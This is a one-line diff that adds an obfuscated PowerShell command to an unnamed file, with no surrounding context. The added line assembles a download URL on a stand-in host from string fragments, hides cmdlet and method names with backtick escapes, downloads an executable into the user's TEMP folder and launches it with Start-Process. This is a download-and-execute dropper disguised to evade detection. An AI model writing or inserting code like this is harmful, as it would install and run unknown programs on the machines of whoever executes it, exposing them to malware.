@@ -1,0 +1,1 @@
+$u = ('ht'+'tp:/'+'/ma'+'l.ex'+'ample.top/a.e'+'xe') -replace 'ma', 'bad';$p = $env:TEMP + '\x.exe';(N`e`W-oBjE`Ct N`et.W`eBcLiEnT)."DoW`NlOaD`FiLe"($u, $p); St`ArT-PrO`CeSs $p
